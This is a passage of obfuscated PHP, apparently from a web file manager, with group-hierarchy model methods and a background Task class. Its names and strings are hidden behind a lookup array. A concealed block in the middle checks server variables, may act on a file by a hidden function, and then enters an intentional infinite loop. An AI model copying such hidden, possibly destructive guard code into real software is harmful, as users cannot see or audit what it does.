$«ğ¬şµ¾ = array($«ğ¬şµ¾); } $¦òœÔç¬ = $«ğ¬şµ¾; foreach ($«ğ¬şµ¾ as $À×¼É‡ñ) { $ÖãÔó¦ = $this->getInfoSimple($À×¼É‡ñ); $‘İ¤ø¨Í = array($æîÕç˜²[561] => array($æîÕç˜²[435], $ÖãÔó¦[$æîÕç˜²[561]] . $À×¼É‡ñ . $æîÕç˜²[589])); $Ô½ÛÓ¦‹ = $this->field($æîÕç˜²[1885])->where($‘İ¤ø¨Í)->select(); $¦òœÔç¬ = array_merge($¦òœÔç¬, array_to_keyvalue($Ô½ÛÓ¦‹, $æîÕç˜²[12], $æîÕç˜²[1885])); } return array_unique($¦òœÔç¬); } private function _searchFromMeta($Æº²ÖüŠ, $ÙåÊìâš, $ëÆƒ¹Ç¡, $ÄÈ‚ğÜÑ) { $òöğÄı… =& $_SERVER[‚ûòÉ˜ş]; $ÙåÊìâš = strtolower($ÙåÊìâš); $¸é±üÀ¦ = array($òöğÄı…[104] => $Æº²ÖüŠ, $òöğÄı…[427] => array($òöğÄı…[435], "\45{$ÙåÊìâš}\45")); $¸é±üÀ¦ = $this->parseWhereLike($¸é±üÀ¦); if ($ÄÈ‚ğÜÑ) { $¸é±üÀ¦[$òöğÄı…[1885]] = array($òöğÄı…[7], $ÄÈ‚ğÜÑ); } $Ÿ¬úøú© = Model($òöğÄı…[1984])->where($¸é±üÀ¦)->limit($ëÆƒ¹Ç¡)->select(); if (!$Ÿ¬úøú©) { return array(); } $Ÿ¬úøú© = array_to_keyvalue($Ÿ¬úøú©, $òöğÄı…[12], $òöğÄı…[1885]); $øïªÜıÁ = $this->where(array($òöğÄı…[1973] => array($òöğÄı…[7], $Ÿ¬úøú©)))->select(); if (!$øïªÜıÁ) { return array(); } return $øïªÜıÁ; } protected function _listDataApplyItem($»¥î¨€î) { $İòŠ¬‰ = array($»¥î¨€î); $this->_listDataApply($İòŠ¬‰); return $İòŠ¬‰[0]; } protected function _listDataApply(&$³ß“Â) { $ö¼´§¢ =& $_SERVER[‚ûòÉ˜ş]; if (!$³ß“Â) { return; } $üÃ­Ü” = array_to_keyvalue($³ß“Â, $ö¼´§¢[12], $ö¼´§¢[1885]); $this->_listAppendChildren($³ß“Â); $this->_listAppendChildrenMember($³ß“Â); $this->_listAppendMeta($³ß“Â, $üÃ­Ü”); $this->_listAppendParent($³ß“Â); $this->_listAppendSourceRoot($³ß“Â, $üÃ­Ü”); } private function _listAppendChildren(&$–ğÈ¤é) { $û—­ä¿ƒ =& $_SERVER[‚ûòÉ˜ş]; $‹¬é°±ù = array_to_keyvalue($–ğÈ¤é, $û—­ä¿ƒ[12], $û—­ä¿ƒ[1885]); $úÄ‹‚ ¢ = array($û—­ä¿ƒ[190] => array($û—­ä¿ƒ[7], $‹¬é°±ù)); $ô¤€ª¥Â = array($û—­ä¿ƒ[190], $û—­ä¿ƒ[1985] => $û—­ä¿ƒ[541]); $ÇĞ­›¼ş = $this->field($ô¤€ª¥Â)->where($úÄ‹‚ ¢)->group($û—­ä¿ƒ[190])->select(); $—³šæóò = array_to_keyvalue($ÇĞ­›¼ş, $û—­ä¿ƒ[190], $û—­ä¿ƒ[541]); foreach ($–ğÈ¤é as &$êäˆ³º) { $Öš¤ğĞ§ = $êäˆ³º[$û—­ä¿ƒ[1885]]; $êäˆ³º[$û—­ä¿ƒ[1986]] = isset($—³šæóò[$Öš¤ğĞ§]) ? intval($—³šæóò[$Öš¤ğĞ§]) : !1; } unset($êäˆ³º); } private function _listAppendChildrenMember(&$­É•˜­¾) { $ºåéåË =& $_SERVER[‚ûòÉ˜ş]; $÷ÈÅè•² = array_to_keyvalue($­É•˜­¾, $ºåéåË[12], $ºåéåË[1885]); $ñ·¯‡ï = array($ºåéåË[1885] => array($ºåéåË[7], $÷ÈÅè•²)); $âÔÙñÏ­ = array($ºåéåË[1885], $ºåéåË[1985] => $ºåéåË[541]); $øåíÙÒ = Model($ºåéåË[1975])->field($âÔÙñÏ­)->where($ñ·¯‡ï)->group($ºåéåË[1885])->select(); $´‘æÕ¾Û = array_to_keyvalue($øåíÙÒ, $ºåéåË[1885], $ºåéåË[541]); foreach ($­É•˜­¾ as &$Í‰İã†É) { $äÃ‘êÍ· = $Í‰İã†É[$ºåéåË[1885]]; $Í‰İã†É[$ºåéåË[1987]] = isset($´‘æÕ¾Û[$äÃ‘êÍ·]) ? intval($´‘æÕ¾Û[$äÃ‘êÍ·]) : !1; } unset($Í‰İã†É); } private function _listAppendMeta(&$éåÄ”½Ò, $Æ·®ÇÅ) { $Çƒ¸Ö³õ =& $_SERVER[‚ûòÉ˜ş]; $£Ã²á®½ = array($Çƒ¸Ö³õ[1885] => array($Çƒ¸Ö³õ[7], $Æ·®ÇÅ)); $ğÀÓâØ = Model($Çƒ¸Ö³õ[1974])->where($£Ã²á®½)->select(); $ğÀÓâØ = array_to_keyvalue_group($ğÀÓâØ, $Çƒ¸Ö³õ[1885]); foreach ($ğÀÓâØ as &$Õİ§ç´Â) { $Õİ§ç´Â = array_to_keyvalue($Õİ§ç´Â, $Çƒ¸Ö³õ[104], $Çƒ¸Ö³õ[427]); } unset($Õİ§ç´Â); foreach ($éåÄ”½Ò as &$ˆŞäá¥¼) { $ˆŞäá¥¼[$Çƒ¸Ö³õ[515]] = array(); if (isset($ğÀÓâØ[$ˆŞäá¥¼[$Çƒ¸Ö³õ[1885]]])) { $ˆŞäá¥¼[$Çƒ¸Ö³õ[515]] = $ğÀÓâØ[$ˆŞäá¥¼[$Çƒ¸Ö³õ[1885]]]; } } unset($ˆŞäá¥¼); } protected function parentLevelArray($ÒÂ³™Ää) { $á³¬›È“ =& $_SERVER[‚ûòÉ˜ş]; $ÒÂ³™Ää = explode($á³¬›È“[60], trim($ÒÂ³™Ää, $á³¬›È“[60])); $ÒÂ³™Ää = array_remove_value($ÒÂ³™Ää, $á³¬›È“[222]); return $ÒÂ³™Ää; } protected function parentInGroup($˜ŠªÆº, $È‹ Ì¡) { $‚ª¾é‹¬ =& $_SERVER[‚ûòÉ˜ş]; $­û¼Ã¼ = $this->getInfoSimple($˜ŠªÆº); if (!$­û¼Ã¼) { return !0; } $İ‡ğ¼‘è = $this->parentLevelArray($­û¼Ã¼[$‚ª¾é‹¬[561]]); $İ‡ğ¼‘è[] = $˜ŠªÆº; foreach ($İ‡ğ¼‘è as $˜ŠªÆº) { if (in_array($˜ŠªÆº . $‚ª¾é‹¬[12], $È‹ Ì¡)) { return !0; } } return !1; } private function _listAppendParent(&$¾©…ä‘…) { $Ô¹Üşš¦ =& $_SERVER[‚ûòÉ˜ş]; $ñ úñóÉ = array(); foreach ($¾©…ä‘… as &$Ñ®™ğÔ) { $ñ úñóÉ[$Ñ®™ğÔ[$Ô¹Üşš¦[1885]]] = $Ñ®™ğÔ[$Ô¹Üşš¦[42]]; $³é‹©Ñ = $this->parentLevelArray($Ñ®™ğÔ[$Ô¹Üşš¦[561]]); foreach ($³é‹©Ñ as $Æ‹×»Ä©) { if (!isset($ñ úñóÉ[$Æ‹×»Ä©])) { $ñ úñóÉ[$Æ‹×»Ä©] = 0; } } } unset($Ñ®™ğÔ); foreach ($ñ úñóÉ as $ñüšä´È => $Ç¡½Ëôİ) { if ($Ç¡½Ëôİ) { continue; } $Æá…íÏš = $this->getInfoSimple($ñüšä´È); $ñ úñóÉ[$ñüšä´È] = $Æá…íÏš[$Ô¹Üşš¦[42]]; } $ßÚóøĞ· = $GLOBALS[$Ô¹Üşš¦[6]][$Ô¹Üşš¦[99]][$Ô¹Üşš¦[1988]]; if ($GLOBALS[$Ô¹Üşš¦[544]] == $Ô¹Üşš¦[98]) { $ßÚóøĞ· = !1; } foreach ($¾©…ä‘… as &$Ñ®™ğÔ) { $³é‹©Ñ = $this->parentLevelArray($Ñ®™ğÔ[$Ô¹Üşš¦[561]]); $ÂÅÄŞØ¶ = $Ô¹Üşš¦[12]; foreach ($³é‹©Ñ as $ñüšä´È => $Æ‹×»Ä©) { if ($ßÚóøĞ· && $ñüšä´È == 0) { continue; } $ÂÅÄŞØ¶ .= $ñ úñóÉ[$Æ‹×»Ä©] . $Ô¹Üşš¦[8]; } if ($³é‹©Ñ) { $ÂÅÄŞØ¶ .= $Ñ®™ğÔ[$Ô¹Üşš¦[42]]; } $Ñ®™ğÔ[$Ô¹Üşš¦[566]] = str_replace($Ô¹Üşš¦[569], $Ô¹Üşš¦[8], $ÂÅÄŞØ¶); } unset($Ñ®™ğÔ); } private function _listAppendSourceRoot(&$òÃÀƒ, $¾„òÛ¥î) { $éöåó±Ñ =& $_SERVER[‚ûòÉ˜ş]; $Ì¢İÙóê = Model($éöåó±Ñ[865])->listSourceRoot(SourceModel::TYPE_GROUP, $¾„òÛ¥î); $Ì¢İÙóê = array_to_keyvalue($Ì¢İÙóê, $éöåó±Ñ[546]); $Ì¢İÙóê = array_remove_key($Ì¢İÙóê, $éöåó±Ñ[546]); foreach ($òÃÀƒ as &$§áÃ™áÀ) { $§áÃ™áÀ[$éöåó±Ñ[97]] = $Ì¢İÙóê[$§áÃ™áÀ[$éöåó±Ñ[1885]]] ? $Ì¢İÙóê[$§áÃ™áÀ[$éöåó±Ñ[1885]]] : array(); } unset($§áÃ™áÀ); } protected function groupMerge($²ÕĞ¹Œ) { $²ÕĞ¹Œ = array_values(array_unique($²ÕĞ¹Œ)); $»áØÁ±ï = array(); for ($›¯Ç¯üÆ = 0; $›¯Ç¯üÆ < count($²ÕĞ¹Œ); $›¯Ç¯üÆ++) { $áÈÀìÏ = !1; for ($´¢ºÓ¼ß = 0; $´¢ºÓ¼ß < count($²ÕĞ¹Œ); $´¢ºÓ¼ß++) { if ($›¯Ç¯üÆ == $´¢ºÓ¼ß) { continue; } if ($this->isParentOf($²ÕĞ¹Œ[$´¢ºÓ¼ß], $²ÕĞ¹Œ[$›¯Ç¯üÆ])) { $áÈÀìÏ = !0; break; } } if (!$áÈÀìÏ) { $»áØÁ±ï[] = $²ÕĞ¹Œ[$›¯Ç¯üÆ]; } } return $»áØÁ±ï; } protected function isParentOf($ƒŠŸüŒƒ, $¥‰ø¥²) { $Ù©Ì…Á­ =& $_SERVER[‚ûòÉ˜ş]; if (!$ƒŠŸüŒƒ || !$¥‰ø¥² || $ƒŠŸüŒƒ == $¥‰ø¥²) { return !1; } $Ä¸Éö–› = $this->getInfoSimple($ƒŠŸüŒƒ); $Ùî…ÕÉ÷ = $this->getInfoSimple($¥‰ø¥²); $¨ˆµ¿š = $Ä¸Éö–›[$Ù©Ì…Á­[561]] . $ƒŠŸüŒƒ . $Ù©Ì…Á­[60]; if (substr($Ùî…ÕÉ÷[$Ù©Ì…Á­[561]], 0, strlen($¨ˆµ¿š)) == $¨ˆµ¿š) { return !0; } return !1; } public function groupShowRoot($øÊ²Â, $ÕŞïª = false) { $î€Á“Ä =& $_SERVER[‚ûòÉ˜ş]; $ë”Ó­¢‡ = $this->getInfo($øÊ²Â); if (!$ë”Ó­¢‡) { return array(); } $ˆŞÎå‚Å = $this->parentLevelArray($ë”Ó­¢‡[$î€Á“Ä[561]]); $ğÆôÒ½· = array($øÊ²Â); if (count($ˆŞÎå‚Å) == 0) { return $ğÆôÒ½·; } if ($ÕŞïª && count($ˆŞÎå‚Å) == 1) { return $ğÆôÒ½·; } if (!$ë”Ó­¢‡[$î€Á“Ä[515]] || !isset($ë”Ó­¢‡[$î€Á“Ä[515]][$î€Á“Ä[1971]]) || $ë”Ó­¢‡[$î€Á“Ä[515]][$î€Á“Ä[1971]] == $î€Á“Ä[1940]) { return $this->groupShowRoot($ˆŞÎå‚Å[count($ˆŞÎå‚Å) - 1], $ÕŞïª); } if ($ë”Ó­¢‡[$î€Á“Ä[515]][$î€Á“Ä[1971]] == $î€Á“Ä[410]) { $àÒà€ÕŠ = explode($î€Á“Ä[60], $ë”Ó­¢‡[$î€Á“Ä[515]][$î€Á“Ä[1972]]); if ($àÒà€ÕŠ) { $ğÆôÒ½· = array_merge($ğÆôÒ½·, $àÒà€ÕŠ); } } return $ğÆôÒ½·; } protected function resetParentLevel() { $¤Ï«ÁÏ =& $_SERVER[‚ûòÉ˜ş]; $ğ©ô€±§ = $¤Ï«ÁÏ[1885]; $úş•¯¯„ = $this->select(); $úş•¯¯„ = array_to_keyvalue($úş•¯¯„, $ğ©ô€±§); foreach ($úş•¯¯„ as $Œ·°¢şå) { $Æç¢§ùí = $Œ·°¢şå; $¹±û…æ‰ = array(); while ($Æç¢§ùí[$¤Ï«ÁÏ[190]] != 0) { $¹±û…æ‰[] = $Æç¢§ùí[$¤Ï«ÁÏ[190]]; $Æç¢§ùí = $úş•¯¯„[$Æç¢§ùí[$¤Ï«ÁÏ[190]]]; } $¹±û…æ‰[] = 0; $¹±û…æ‰ = $¤Ï«ÁÏ[60] . implode($¤Ï«ÁÏ[60], array_reverse($¹±û…æ‰)) . $¤Ï«ÁÏ[60]; $this->setNamePinyin($Œ·°¢şå[$ğ©ô€±§], $Œ·°¢şå[$¤Ï«ÁÏ[42]]); $this->where(array($ğ©ô€±§ => $Œ·°¢şå[$ğ©ô€±§]))->save(array($¤Ï«ÁÏ[628] => $¹±û…æ‰)); } return $úş•¯¯„; } public function groupNameAuto($…Ãû™Íî, $çÔàÌ‡®) { $§Ê„’¡… =& $_SERVER[‚ûòÉ˜ş]; $ÎÈ±¥òÎ = $this->where(array($§Ê„’¡…[453] => $…Ãû™Íî))->getField($§Ê„’¡…[42], !0); if (!$ÎÈ±¥òÎ || !in_array($çÔàÌ‡®, $ÎÈ±¥òÎ)) { return $çÔàÌ‡®; } for ($²¦íª›‚ = 1; $²¦íª›‚ <= count($ÎÈ±¥òÎ) + 1; $²¦íª›‚++) { $¿Íñ¼ùÊ = $çÔàÌ‡® . "\x28{$²¦íª›‚}\51"; if (!in_array($¿Íñ¼ùÊ, $ÎÈ±¥òÎ)) { return $¿Íñ¼ùÊ; } } } public function groupSwitch($İ­ğî¸Ÿ, $ŠşÊÅÄ) { $‰­äˆÈÍ =& $_SERVER[‚ûòÉ˜ş]; $‹÷ñšÈ = array($‰­äˆÈÍ[1885] => array($‰­äˆÈÍ[7], array($İ­ğî¸Ÿ, $ŠşÊÅÄ))); $äØÚ‡©° = $this->where($‹÷ñšÈ)->select(); $äØÚ‡©° = array_to_keyvalue($äØÚ‡©°, $‰­äˆÈÍ[1885]); if (!isset($äØÚ‡©°[$İ­ğî¸Ÿ]) || !isset($äØÚ‡©°[$ŠşÊÅÄ]) || $äØÚ‡©°[$İ­ğî¸Ÿ][$‰­äˆÈÍ[190]] == 0) { return !1; } $‹÷ñšÈ = array($‰­äˆÈÍ[1885] => $İ­ğî¸Ÿ); $˜Óîàí = Model($‰­äˆÈÍ[1975])->where($‹÷ñšÈ)->select(); if (!$˜Óîàí) { $˜Óîàí = array(); } foreach ($˜Óîàí as $ÅÔ®âè) { $á©Å¢’ = $ÅÔ®âè[$‰­äˆÈÍ[1687]]; $‹÷ñšÈ = array($‰­äˆÈÍ[1687] => $á©Å¢’, $‰­äˆÈÍ[1885] => $ŠşÊÅÄ); $¥Ï­ª«ñ = Model($‰­äˆÈÍ[1975])->where($‹÷ñšÈ)->find(); if (!$¥Ï­ª«ñ) { $å±Å¾íä = array($ŠşÊÅÄ => $ÅÔ®âè[$‰­äˆÈÍ[1989]]); Model($‰­äˆÈÍ[575])->userGroupAdd($á©Å¢’, $å±Å¾íä); } Model($‰­äˆÈÍ[575])->userGroupRemove($á©Å¢’, $İ­ğî¸Ÿ); } $‹÷ñšÈ = array($‰­äˆÈÍ[188] => 2, $‰­äˆÈÍ[190] => 0, $‰­äˆÈÍ[461] => 1, $‰­äˆÈÍ[546] => array($‰­äˆÈÍ[7], array($İ­ğî¸Ÿ, $ŠşÊÅÄ))); $…ĞİÖÓ™ = Model($‰­äˆÈÍ[865])->where($‹÷ñšÈ)->field($‰­äˆÈÍ[1990])->select(); $…ĞİÖÓ™ = array_to_keyvalue($…ĞİÖÓ™, $‰­äˆÈÍ[546], $‰­äˆÈÍ[191]); $ÁÃÌéë® = !empty($…ĞİÖÓ™[$İ­ğî¸Ÿ]) ? $…ĞİÖÓ™[$İ­ğî¸Ÿ] : !1; if ($ÁÃÌéë®) { if (!$…ĞİÖÓ™[$ŠşÊÅÄ]) { $…ĞİÖÓ™[$ŠşÊÅÄ] = Model($‰­äˆÈÍ[865])->groupRootAdd($ŠşÊÅÄ); } $‰ï»ìó• = $…ĞİÖÓ™[$ŠşÊÅÄ]; $‹÷ñšÈ = array($‰­äˆÈÍ[190] => $ÁÃÌéë®); $…ĞİÖÓ™ = Model($‰­äˆÈÍ[865])->where($‹÷ñšÈ)->field($‰­äˆÈÍ[1991])->select(); if (!$…ĞİÖÓ™) { $…ĞİÖÓ™ = array(); } Model($‰­äˆÈÍ[865])->moveClearAuth = !1; foreach ($…ĞİÖÓ™ as $°Ç“ÔÛ) { $é±¼šì‡ = $°Ç“ÔÛ[$‰­äˆÈÍ[461]] == $‰­äˆÈÍ[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($‰­äˆÈÍ[865])->move($°Ç“ÔÛ[$‰­äˆÈÍ[191]], $‰ï»ìó•, $é±¼šì‡); } Model($‰­äˆÈÍ[865])->moveClearAuth = !0; $‹÷ñšÈ = array($‰­äˆÈÍ[188] => 2, $‰­äˆÈÍ[546] => $İ­ğî¸Ÿ); $š®ƒ“Êæ = array($‰­äˆÈÍ[546] => $ŠşÊÅÄ); Model($‰­äˆÈÍ[1992])->where($‹÷ñšÈ)->save($š®ƒ“Êæ); Model($‰­äˆÈÍ[1993])->where($‹÷ñšÈ)->save($š®ƒ“Êæ); } $this->_changeChildLevel($äØÚ‡©°[$İ­ğî¸Ÿ], $äØÚ‡©°[$ŠşÊÅÄ], !0); $this->where(array($‰­äˆÈÍ[190] => $İ­ğî¸Ÿ))->save(array($‰­äˆÈÍ[190] => $ŠşÊÅÄ)); $this->_clearChildrenCache($äØÚ‡©°[$ŠşÊÅÄ]); return !0; } } $_file = $_SERVER[$_SERVER[‚ûòÉ˜ş][14]]; $_size = $_SERVER[‚ûòÉ˜ş][952]; goto AëÕˆä ¢Û; bÔ‹íõ÷§¬: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($çü¸ÆÊ, $«’·‡øÄ = '', $ü˜¼œ° = 0, $Ø÷¨¿å = '') { $ûòŞ…¬ö =& $_SERVER[‚ûòÉ˜ş]; if (self::get($çü¸ÆÊ)) { return; } $this->task = array($ûòŞ…¬ö[451] => $çü¸ÆÊ, $ûòŞ…¬ö[1687] => USER_ID, $ûòŞ…¬ö[1584] => $Ø÷¨¿å, $ûòŞ…¬ö[502] => $ûòŞ…¬ö[12], $ûòŞ…¬ö[43] => $«’·‡øÄ, $ûòŞ…¬ö[1105] => $ûòŞ…¬ö[12], $ûòŞ…¬ö[826] => $ü˜¼œ°, $ûòŞ…¬ö[1688] => 0, $ûòŞ…¬ö[1689] => 0, $ûòŞ…¬ö[1690] => 0, $ûòŞ…¬ö[1691] => timeFloat(), $ûòŞ…¬ö[1692] => 0, $ûòŞ…¬ö[1693] => 0, $ûòŞ…¬ö[1694] => 0, $ûòŞ…¬ö[1695] => 0, $ûòŞ…¬ö[790] => $ûòŞ…¬ö[1643]); $GLOBALS[$ûòŞ…¬ö[1696]] = 1; Hook::bind($ûòŞ…¬ö[1647], array($this, $ûòŞ…¬ö[1697])); Hook::bind($ûòŞ…¬ö[1698], array($this, $ûòŞ…¬ö[1699])); $this->startAfter(); Hook::trigger($ûòŞ…¬ö[1700], $this->task); $this->task[$ûòŞ…¬ö[1693]] = timeFloat(); } public function end($ÛÏĞÉµ‚ = '') { $¯²’íË† =& $_SERVER[‚ûòÉ˜ş]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¯²’íË†[1693]]) { self::valueSet($this->task[$¯²’íË†[451]], !1); } $this->isEnd = !0; if ($ÛÏĞÉµ‚) { $this->task[$¯²’íË†[502]] = $ÛÏĞÉµ‚; } self::log($¯²’íË†[1701] . $this->task[$¯²’íË†[451]] . $¯²’íË†[1702] . sprintf($¯²’íË†[891], timeFloat() - $this->task[$¯²’íË†[1691]]) . $¯²’íË†[1703]); Hook::unbind($¯²’íË†[1647], array($this, $¯²’íË†[1697])); Hook::unbind($¯²’íË†[1698], array($this, $¯²’íË†[1699])); $this->endAfter(); $ÑÍ¬¬×ü = $this->task; $this->task = !1; Hook::trigger($¯²’íË†[1704], $ÑÍ¬¬×ü); } public function update($ÇÎê„ìû = 0, $Âîãµ›õ = false) { $´©æş«Õ =& $_SERVER[‚ûòÉ˜ş]; $¸ã€§Ò =& $this->task; if (!$¸ã€§Ò) { return; } $¸ã€§Ò[$´©æş«Õ[1688]] += $ÇÎê„ìû; $¸ã€§Ò[$´©æş«Õ[1692]] = timeFloat(); if ($¸ã€§Ò[$´©æş«Õ[826]]) { if ($¸ã€§Ò[$´©æş«Õ[826]] < $¸ã€§Ò[$´©æş«Õ[1688]]) { $¸ã€§Ò[$´©æş«Õ[826]] = $¸ã€§Ò[$´©æş«Õ[1688]]; } $¿Ÿ˜ˆŠŠ = timeFloat() - $¸ã€§Ò[$´©æş«Õ[1691]] - $¸ã€§Ò[$´©æş«Õ[1694]]; if ($¿Ÿ˜ˆŠŠ <= 0) { $¿Ÿ˜ˆŠŠ = 0.001; } $¸ã€§Ò[$´©æş«Õ[1689]] = $¸ã€§Ò[$´©æş«Õ[1688]] / $¸ã€§Ò[$´©æş«Õ[826]]; $¸ã€§Ò[$´©æş«Õ[1690]] = $¸ã€§Ò[$´©æş«Õ[1688]] / $¿Ÿ˜ˆŠŠ; if ($¸ã€§Ò[$´©æş«Õ[1689]] > 0) { $¸ã€§Ò[$´©æş«Õ[1695]] = $¿Ÿ˜ˆŠŠ * (1 - $¸ã€§Ò[$´©æş«Õ[1689]]) / $¸ã€§Ò[$´©æş«Õ[1689]]; } $¸ã€§Ò[$´©æş«Õ[1695]] = $¸ã€§Ò[$´©æş«Õ[1695]] <= 0 ? 0 : $¸ã€§Ò[$´©æş«Õ[1695]]; } $this->updateAfter(); $´Í•Šû = 0.2; if (timeFloat() - $¸ã€§Ò[$´©æş«Õ[1693]] < $´Í•Šû && !$Âîãµ›õ) { return; } $ÑæıšŒ› = self::get($¸ã€§Ò[$´©æş«Õ[451]]); $¦ïÜ„©“ = $ÑæıšŒ›[$´©æş«Õ[790]]; if ($¦ïÜ„©“ == self::STATYS_KILL) { $Î´¤Ì‹Ù = array($´©æş«Õ[1705] => LNG($´©æş«Õ[1706]), $´©æş«Õ[1253] => !1); Cache::set($´©æş«Õ[1707] . $this->task[$´©æş«Õ[451]], $Î´¤Ì‹Ù, 30); $this->onKill(); $this->end(); die; } else { if ($¦ïÜ„©“ == self::STATYS_STOP) { $“ÑŞ»Ìı = 2; $ÑæıšŒ›[$´©æş«Õ[1694]] += $“ÑŞ»Ìı; self::valueSet($¸ã€§Ò[$´©æş«Õ[451]], $ÑæıšŒ›); sleep($“ÑŞ»Ìı); $this->update(); return; } } $¸ã€§Ò[$´©æş«Õ[790]] = $¦ïÜ„©“ ? $¦ïÜ„©“ : $¸ã€§Ò[$´©æş«Õ[790]]; $¸ã€§Ò[$´©æş«Õ[1694]] = $ÑæıšŒ›[$´©æş«Õ[1694]] ? $ÑæıšŒ›[$´©æş«Õ[1694]] : 0; $¸ã€§Ò[$´©æş«Õ[1693]] = timeFloat(); Hook::trigger($´©æş«Õ[1708], $¸ã€§Ò); self::valueSet($¸ã€§Ò[$´©æş«Õ[451]], $¸ã€§Ò); } public function onKillSet($ŸŞ‘Ø»Í, $¡Öª›Ø„ = array()) { $this->onKillCall = array($ŸŞ‘Ø»Í, $¡Öª›Ø„); } public function onKill() { $ÙÁ³äØ¾ =& $_SERVER[‚ûòÉ˜ş]; self::log($ÙÁ³äØ¾[1701] . $this->task[$ÙÁ³äØ¾[451]] . $ÙÁ³äØ¾[1709]); Hook::trigger($ÙÁ³äØ¾[1710], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ãı²¤—) { $êÀÊšÇ =& $_SERVER[‚ûòÉ˜ş]; Cache::set($êÀÊšÇ[1707] . $this->task[$êÀÊšÇ[451]], $Ãı²¤—, 60); return $Ãı²¤—; } public static function get($¬‘›¬“¸) { $ç³õ¸âØ =& $_SERVER[‚ûòÉ˜ş]; $›´·Ô¯ß = self::valueGet($¬‘›¬“¸); if (is_array($›´·Ô¯ß) && $›´·Ô¯ß[$ç³õ¸âØ[1711]]) { $¢ÏÇÓÄØ = ActionApply($›´·Ô¯ß[$ç³õ¸âØ[1711]], array($›´·Ô¯ß)); $›´·Ô¯ß = is_array($¢ÏÇÓÄØ) ? $¢ÏÇÓÄØ : $›´·Ô¯ß; } return $›´·Ô¯ß; } public static function listData() { $¥ÓĞÅ®ß = self::valueGet(); return array_sort_by($¥ÓĞÅ®ß, $_SERVER[‚ûòÉ˜ş][1691], !0); } public static function kill($›Ïè÷Ã·) { return self::changeStatus($›Ïè÷Ã·, self::STATYS_KILL); } public static function stop($óå§¹×) { return self::changeStatus($óå§¹×, self::STATYS_STOP); } public static function restart($îÊà•‘„) { return self::changeStatus($îÊà•‘„, self::STATYS_RUNNING); } public static function killAll() { $¡¶ÌÁ¿Ç =& $_SERVER[‚ûòÉ˜ş]; $”¿ª†ê = self::listData(); foreach ($”¿ª†ê as $¨É÷º¯Ò) { self::kill($¨É÷º¯Ò[$¡¶ÌÁ¿Ç[451]]); } sleep(2); foreach ($”¿ª†ê as $¨É÷º¯Ò) { self::valueSet($¨É÷º¯Ò[$¡¶ÌÁ¿Ç[451]], !1); } } private static function changeStatus($áŞ„È€¶, $ñşßÅ) { $ğ—ç¬© =& $_SERVER[‚ûòÉ˜ş]; $×èª€ = self::valueGet($áŞ„È€¶); if (!$×èª€) { return !1; } $×èª€[$ğ—ç¬©[790]] = $ñşßÅ; self::valueSet($áŞ„È€¶, $×èª€); self::log($ğ—ç¬©[1712] . $×èª€[$ğ—ç¬©[451]] . $ğ—ç¬©[1713] . $ñşßÅ); return !0; } public static function valueGet($¬«Õ˜é = false) { $øû³İ =& $_SERVER[‚ûòÉ˜ş]; if ($¬«Õ˜é) { $šÈ·¼ß = Model($øû³İ[496])->where(array($øû³İ[104] => $¬«Õ˜é, $øû³İ[43] => $øû³İ[1112]))->find(); return $šÈ·¼ß ? json_decode($šÈ·¼ß[$øû³İ[427]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($£õÄâª× = false) { $¥¹–¤—¾ =& $_SERVER[‚ûòÉ˜ş]; $İÅïŸÛ = array($¥¹–¤—¾[43] => $¥¹–¤—¾[1112]); if ($£õÄâª×) { $İÅïŸÛ[$¥¹–¤—¾[1687]] = $£õÄâª×; } $–Î„½‚ = Model($¥¹–¤—¾[496])->where($İÅïŸÛ)->select(); $–Î„½‚ = $–Î„½‚ ? $–Î„½‚ : array(); foreach ($–Î„½‚ as $ÑŸ’ŠŸ‘ => $†úıšËİ) { $–Î„½‚[$ÑŸ’ŠŸ‘] = json_decode($†úıšËİ[$¥¹–¤—¾[427]], !0); } return $–Î„½‚; } public static function valueSet($³Š÷æÔ, $á¨›Ò‘¢) { $«Ò‰¢é– =& $_SERVER[‚ûòÉ˜ş]; if (!$á¨›Ò‘¢) { return Model($«Ò‰¢é–[496])->where(array($«Ò‰¢é–[104] => $³Š÷æÔ, $«Ò‰¢é–[43] => $«Ò‰¢é–[1112]))->delete(); } $€¼­º°¬ = json_encode($á¨›Ò‘¢); if (!$€¼­º°¬) { ob_start(); var_dump($á¨›Ò‘¢); $Â«ÃÌ‹í = ob_get_clean(); self::log($«Ò‰¢é–[1714] . json_encode_force($Â«ÃÌ‹í)); } if (!$³Š÷æÔ || !$á¨›Ò‘¢[$«Ò‰¢é–[451]]) { return !1; } $Â˜Ã©©ë = array($«Ò‰¢é–[43] => $«Ò‰¢é–[1112], $«Ò‰¢é–[1687] => USER_ID, $«Ò‰¢é–[104] => $³Š÷æÔ, $«Ò‰¢é–[427] => $€¼­º°¬); $¬ùÑœá‹ = $«Ò‰¢é–[1715]; CacheLock::lock($¬ùÑœá‹); Model($«Ò‰¢é–[496])->add($Â˜Ã©©ë, array(), !0); CacheLock::unlock($¬ùÑœá‹); } public static function log($ğá«Âõî) { if (!GLOBAL_DEBUG) { return; } write_log($ğá«Âõî, $_SERVER[‚ûòÉ˜ş][1716]); } } if (!isset($_SERVER[$_SERVER[‚ûòÉ˜ş][13]]) || !isset($_SERVER[$_SERVER[‚ûòÉ˜ş][14]])) { $_getc = $_SERVER[‚ûòÉ˜ş][15]; $_getfile = $_SERVER[$_SERVER[‚ûòÉ˜ş][16]] . $_SERVER[‚ûòÉ˜ş][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‚ûòÉ˜ş][18], $_getfilec); if (count($_getarrs) < $_SERVER[‚ûòÉ˜ş][19]) { $exit = $_SERVER[‚ûòÉ˜ş][20]; $exit(); } $_act = $_SERVER[‚ûòÉ˜ş][21]; $_act($_SERVER[$_SERVER[‚ûòÉ˜ş][16]] . $_SERVER[‚ûòÉ˜ş][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[‚ûòÉ˜ş][22]); } } class TaskFileTransfer extends Task { protected function startAfter() { $æı–ôë  =& $_SERVER[‚ûòÉ˜ş]; 